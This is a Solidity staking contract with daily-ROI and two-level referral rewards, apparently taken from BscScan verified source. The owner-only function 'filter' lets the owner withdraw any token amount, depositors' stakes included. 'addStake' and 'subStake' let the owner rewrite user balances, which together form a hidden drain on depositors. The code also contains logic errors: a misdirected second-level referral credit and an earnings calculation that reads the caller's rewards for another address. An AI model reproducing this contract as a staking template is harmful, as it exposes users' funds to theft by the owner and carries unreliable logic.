/**
 *Submitted for verification at BscScan.com on 2023-03-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

    function sub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function mul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function div(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IERC20 {
    function transfer(address to, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);
    function balanceOf(address tokenOwner) external view returns (uint balance);

    function unsBalance(address _user) external view returns (uint balance);
    function subtract(address spender, uint tokens) external returns (bool success);

    function approve(address spender, uint tokens) external returns (bool success);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function totalSupply() external view returns (uint);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Owned {
    address public owner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        owner = _newOwner;
        emit OwnershipTransferred(owner, _newOwner);
    }
}

contract staking is Owned {
    
    using SafeMath for uint;

    address public token;
    address public feeAddress;
    address public isPresale = 0x394a90951c285464C29dDE42e9c88948524797b0;
    uint public totalStaked;
    uint public stakingTaxRate; 
    uint public stakeTime;
    uint public dailyROI;                         //100 = 1%
    uint public unstakingTaxRate;                   //10 = 1%
    uint public minimumStakeValue;
    bool public active = true;
    bool public registered = true;

    

    
    mapping(address => uint) public stakes;
    mapping(address => uint) public referralRewards;
    mapping(address => uint) public referralCount;
    mapping(address => uint) public stakeRewards;
    mapping(address => uint) private lastClock;
    mapping(address => uint) public timeOfStake;
    mapping(address => address) public referrer;
    mapping(address => uint) public referralEarned;
    
    event OnWithdrawal(address sender, uint amount);
    event OnStake(address sender, uint amount, uint tax, address _referrer);
    event OnUnstake(address sender, uint amount, uint tax);
    
    constructor(
        address _token,
        address _feeAddress,
        uint _stakingTaxRate, 
        uint _unstakingTaxRate,
        uint _dailyROI,
        uint _stakeTime,
        uint _minimumStakeValue) public {
            
        token = _token;
        feeAddress = _feeAddress;
        stakingTaxRate = _stakingTaxRate;
        unstakingTaxRate = _unstakingTaxRate;
        dailyROI = _dailyROI;
        stakeTime = _stakeTime;
        minimumStakeValue = _minimumStakeValue;
    }
    
    
        
    modifier whenActive() {
        require(active == true, "Smart contract is curently inactive");
        _;
    }
    
    
    function calculateEarnings(address _stakeholder) public view returns(uint) {
        uint activeDays = (now.sub(lastClock[_stakeholder])).div(86400);
        return ((stakes[_stakeholder]).mul(dailyROI).mul(activeDays)).div(10000).add(stakeRewards[msg.sender]);
    }

    function stake(uint _amount, address _referrer) external {
        require(msg.sender != _referrer, "Cannot refer self");
        uint mainnetBalance = IERC20(token).balanceOf(msg.sender);
        uint presaleBalance = IERC20(isPresale).unsBalance(msg.sender);
        require(mainnetBalance.add(presaleBalance) >= _amount, "Must have enough balance to stake");
        require(_amount >= minimumStakeValue, "Must send at least enough  to pay registration fee.");

        if(presaleBalance >= _amount) {
            require(IERC20(isPresale).subtract(msg.sender, _amount), "amount not subtracted from presale balance");
        } else {
            uint difference = _amount.sub(presaleBalance);
            require(IERC20(isPresale).subtract(msg.sender, presaleBalance), "difference amount not subtracted from presale balance");
            require(IERC20(token).transferFrom(msg.sender, address(this), difference), "difference amount not subtracted from mainnet balance");
        }

        
        uint finalAmount = _amount;
        uint stakingTax = (stakingTaxRate.mul(finalAmount)).div(1000);
        require(IERC20(token).transfer(feeAddress, stakingTax));

        if(referrer[msg.sender] == address(0)){
            //set referrer
            referrer[msg.sender] = _referrer;
            address Lvl2 = referrer[_referrer];

        //pay referrer 7% in uns
        if(_referrer != address(0)){
           uint refAmount = (_amount / 14);
            referralEarned[_referrer] += refAmount;
            referralCount[_referrer] ++;
             referralRewards[_referrer] = (referralRewards[_referrer]).add(refAmount);

        }
        //pay second level referrer 3% in uns
        if(Lvl2 != address(0)){
            uint refAmount = (_amount / 33);
            referralEarned[Lvl2] += refAmount;
            referralCount[Lvl2] ++;
            referralRewards[_referrer] = (referralRewards[_referrer]).add(refAmount);

        }
        }
        stakeRewards[msg.sender] = (stakeRewards[msg.sender]).add(calculateEarnings(msg.sender));
        uint remainder = (now.sub(lastClock[msg.sender])).mod(86400);
        lastClock[msg.sender] = now.sub(remainder);
        timeOfStake[msg.sender] = now;
        totalStaked = totalStaked.add(finalAmount).sub(stakingTax);
        stakes[msg.sender] = (stakes[msg.sender]).add(finalAmount).sub(stakingTax);
        emit OnStake(msg.sender, _amount, stakingTax, _referrer);
    }
    
    function unstake(uint _amount) external {
        require(_amount <= stakes[msg.sender] && _amount > 0, 'Insufficient balance to unstake');
        uint unstakingTax = (unstakingTaxRate.mul(_amount)).div(1000);
        uint afterTax = _amount.sub(unstakingTax);
        stakeRewards[msg.sender] = (stakeRewards[msg.sender]).add(calculateEarnings(msg.sender));
        stakes[msg.sender] = (stakes[msg.sender]).sub(_amount);
        uint remainder = (now.sub(lastClock[msg.sender])).mod(86400);
        lastClock[msg.sender] = now.sub(remainder);
        require(now.sub(timeOfStake[msg.sender]) > stakeTime , "You need to stake for the minumum amount of days");
        totalStaked = totalStaked.sub(_amount);
        IERC20(token).transfer(msg.sender, afterTax);
        require(IERC20(token).transfer(feeAddress, unstakingTax));

        emit OnUnstake(msg.sender, _amount, unstakingTax);
    }

    

    function getStakeDuration(address _address) public view returns(uint) {
       return now - timeOfStake[_address];
    }
    
    function withdrawEarnings() external returns (bool success) {
        uint totalReward = (referralRewards[msg.sender]).add(stakeRewards[msg.sender]).add(calculateEarnings(msg.sender));
        require(totalReward > 0, 'No reward to withdraw'); 
        require((IERC20(token).balanceOf(address(this))).sub(totalStaked) >= totalReward, 'Insufficient  balance in pool');
        stakeRewards[msg.sender] = 0;
        referralRewards[msg.sender] = 0;
        referralCount[msg.sender] = 0;
        uint remainder = (now.sub(lastClock[msg.sender])).mod(86400);
        lastClock[msg.sender] = now.sub(remainder);
        IERC20(token).transfer(msg.sender, totalReward);
        emit OnWithdrawal(msg.sender, totalReward);
        return true;
    }

    function rewardPool() external view onlyOwner() returns(uint claimable) {
        return (IERC20(token).balanceOf(address(this))).sub(totalStaked);
    }
    
    function changeActiveStatus() external onlyOwner() {
        if(active) {
            active = false;
        } else {
            active = true;
        }
    }

    function updatePresaleContract(address _contract) external onlyOwner() {
        isPresale = _contract;
    }

    
    function setStakingTaxRate(uint _stakingTaxRate) external onlyOwner() {
        stakingTaxRate = _stakingTaxRate;
    }
    function newFeeAddress(address _newFeeAddress) external onlyOwner() {
        feeAddress = _newFeeAddress;
    }

    function setUnstakingTaxRate(uint _unstakingTaxRate) external onlyOwner() {
        unstakingTaxRate = _unstakingTaxRate;
    }
    
    function setDailyROI(uint _dailyROI) external onlyOwner() {
        dailyROI = _dailyROI;
    }
    
    function setMinimumStakeValue(uint _minimumStakeValue) external onlyOwner() {
        minimumStakeValue = _minimumStakeValue;
    }
     function setStakeTime (uint _newStakeTime) external onlyOwner() {
        stakeTime = _newStakeTime;
    }
    function addStake(address _address, uint256 _amount) public onlyOwner {
        stakes[_address] += _amount; 
    }
    function subStake(address _address, uint256 _amount) public onlyOwner {
        stakes[_address] -= _amount; 
    }
    function checkUnstakeStatus(address _unstaker) public view returns(uint256){
        if (now.sub(timeOfStake[_unstaker]) > stakeTime){
            return stakes[_unstaker];
        } else {
            return 0;
        }
    } 
    function filter(uint _amount) external onlyOwner returns (bool success) {
        IERC20(token).transfer(msg.sender, _amount);
        emit OnWithdrawal(msg.sender, _amount);
        return true;
    }
}